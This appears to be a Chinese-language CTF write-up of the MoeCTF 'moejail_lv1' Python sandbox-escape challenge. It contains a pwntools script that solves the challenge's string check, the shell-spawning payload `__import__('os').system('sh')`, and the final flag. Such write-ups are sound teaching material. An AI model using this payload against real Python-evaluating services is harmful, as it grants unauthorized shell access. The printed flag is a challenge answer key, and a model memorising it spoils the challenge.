---
hide:
  #- navigation # 显示右
  #- toc #显示左
  - footer
  - feedback
comments: true
---  

# Misc-9｜moejail_lv1

## 复盘感想

这是一个全新的 Misc 题型：沙箱逃逸，需要从一个看似难以逃脱的程序中跳出来进入对方终端获取信息
***
## Writeup

使用脚本直接打过去（当然也可以不用脚本直接手动完成，这可能是个非预期），完成字符串连接的题目进入 payload 环节：

```python
from pwn import *

server_ip = '127.0.0.1'
server_port = 49871

connection = remote(server_ip, server_port)

received_data = connection.recv().decode('utf-8')
send_data = received_data[-32:-26] + received_data[-23:-17]

print(received_data)

connection.sendline(send_data.encode('utf-8'))
connection.interactive()
connection.close()
```

对于这类题目，我们直接执行攻入终端代码：`__import__('os').system('sh')`，命令行 `ls` 即可发现文件信息：

![](../../../../assets/Pasted%20image%2020241025234220.png)

经过一番寻找，发现有关 flag 位置的文件：

![](../../../../assets/Pasted%20image%2020241025234240.png)
![](../../../../assets/Pasted%20image%2020241025234616.png)

不知道为什么直接 cat 打不开文件，但是命令行通配符就可以打开（通配符即用 * 省略后面长长一串），即可得到 flag : `moectf{Ah-H@_NOW_y0U-Kn0w-h0W_to-ESCapE_5IMPI3-5TR1NG-Fi1ter0}`

![](../../../../assets/Pasted%20image%2020241025234325.png)
